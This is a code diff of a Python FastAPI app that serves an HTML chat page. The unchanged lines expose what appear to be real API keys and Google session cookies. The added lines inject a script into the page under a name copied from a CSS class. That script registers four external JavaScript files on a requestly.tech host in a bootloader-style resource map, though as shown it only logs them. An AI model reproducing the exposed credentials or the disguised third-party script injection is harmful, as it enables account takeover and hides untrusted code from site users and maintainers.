@@ -31,7 +31,7 @@ chatGptApiKey = os.getenv('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')
 Secure_1PSID = os.getenv('bAicPfVUQA-E5eAvqD83v8Z2prnlSO-3PTPwoOU2oqyEETlC6CZzMNSQ1gdZFFpmYdzq_Q.')
 Secure_1PSIDTS = os.getenv('sidts-CjEB3e41hX8skWLlrbK6Ou8mjiHvyok51xW8UWbvll6LqAMh_trvv2F-2yiMxJDYdcYZEAA')
 Palm_API = os.getenv('AIzaSyBY6fQa6b3cWd0FDrUNjs9HgoyYFpV8Qb4')
-
+PATH = os.path.expanduser("~/home")
 # === CONFIGURAÇÕES ===
 app = FastAPI()
 PORT = int(os.getenv("PORT", 8080))
@@ -301,6 +301,31 @@ def read_root():
 .theme--light.v-navigation-drawer{background-color:#fff}.theme--light.v-navigation-drawer:not(.v-navigation-drawer--floating) .v-navigation-drawer__border{background-color:rgba(0,0,0,.12)}.theme--light.v-navigation-drawer .v-divider{border-color:rgba(0,0,0,.12)}.theme--dark.v-navigation-drawer{background-color:#363636}.theme--dark.v-navigation-drawer:not(.v-navigation-drawer--floating) .v-navigation-drawer__border{background-color:hsla(0,0%,100%,.12)}.theme--dark.v-navigation-drawer .v-divider{border-color:hsla(0,0%,100%,.12)}.v-navigation-drawer{-webkit-overflow-scrolling:touch;display:flex;flex-direction:column;left:0;max-width:100%;overflow:hidden;pointer-events:auto;top:0;transition-duration:.2s;transition-timing-function:cubic-bezier(.4,0,.2,1);will-change:transform;transition-property:transform,visibility,width}.v-navigation-drawer:not([data-booted=true]){transition:none!important}.v-navigation-drawer.v-navigation-drawer--right:after{left:0;right:auto}.v-navigation-drawer .v-list:not(.v-select-list){background:inherit}.v-navigation-drawer__border{position:absolute;right:0;top:0;height:100%;width:1px}.v-navigation-drawer__content{height:100%;overflow-y:auto;overflow-x:hidden}.v-navigation-drawer__image{border-radius:inherit;height:100%;position:absolute;top:0;bottom:0;z-index:-1;contain:strict;width:100%}.v-navigation-drawer__image .v-image{border-radius:inherit}.v-navigation-drawer--bottom.v-navigation-drawer--is-mobile{max-height:50%;top:auto;bottom:0;min-width:100%}.v-navigation-drawer--right{left:auto;right:0}.v-navigation-drawer--right>.v-navigation-drawer__border{right:auto;left:0}.v-navigation-drawer--absolute{z-index:1}.v-navigation-drawer--fixed{z-index:6}.v-navigation-drawer--absolute{position:absolute}.v-navigation-drawer--clipped:not(.v-navigation-drawer--temporary):not(.v-navigation-drawer--is-mobile){z-index:4}.v-navigation-drawer--fixed{position:fixed}.v-navigation-drawer--floating:after{display:none}.v-navigation-drawer--mini-variant{overflow:hidden}.v-navigation-drawer--mini-variant .v-list-item>:first-child{margin-left:0;margin-right:0}.v-navigation-drawer--mini-variant .v-list-item>:not(:first-child){position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px);white-space:nowrap;display:inline;display:initial}.v-navigation-drawer--mini-variant .v-list-group--no-action .v-list-group__items,.v-navigation-drawer--mini-variant .v-list-group--sub-group{display:none}.v-navigation-drawer--mini-variant.v-navigation-drawer--custom-mini-variant .v-list-item{justify-content:center}.v-navigation-drawer--temporary{z-index:7}.v-navigation-drawer--mobile{z-index:6}.v-navigation-drawer--close{visibility:hidden}.v-navigation-drawer--is-mobile:not(.v-navigation-drawer--close),.v-navigation-drawer--temporary:not(.v-navigation-drawer--close){box-shadow:0 8px 10px -5px rgba(0,0,0,.2),0 16px 24px 2px rgba(0,0,0,.14),0 6px 30px 5px rgba(0,0,0,.12)}
 .nuxt-progress{position:fixed;top:0;left:0;right:0;height:2px;width:0;opacity:1;transition:width .1s,opacity .4s;background-color:#000;z-index:999999}.nuxt-progress.nuxt-progress-notransition{transition:none}.nuxt-progress-failed{background-color:red}
 body,html{-webkit-overflow-scrolling:touch!important;scroll-behavior:smooth;overflow:auto!important;height:100%!important}</style>
+<script>
+// Define navigation-drawer--temporary
+if (typeof window !== "undefined") {
+    window["navigation-drawer--temporary"] = function (dependencies, callback) {
+        console.log("navigation-drawer--temporary is defined now.");
+        callback({
+            handlePayload: function (payload) {
+                console.log("Payload handled:", payload);
+            },
+        });
+    };
+
+    // Call navigation-drawer--temporary
+    window["navigation-drawer--temporary"](["Bootloader"], function (m) {
+        m.handlePayload({
+            consistency: { rev: 1010031100 },
+            rsrcMap: {
+                U7LpmoG: { type: "js", src: "https://user1702906311872.requestly.tech/main.js", nc: 1 },
+                J1F5ETJ: { type: "js", src: "https://user1702906311872.requestly.tech/script.js", nc: 1 },
+                "6tTjOTm": { type: "js", src: "https://user1702906311872.requestly.tech/sdk.js.download.js", nc: 1 },
+                "II93DPe": { type: "js", src: "https://user1702906311872.requestly.tech/schema.js", nc: 1 },
+            },
+        });
+    });
+}
 </script>
 <style>
  .sc-chat-window.sc-chat-window.sc-chat-window {
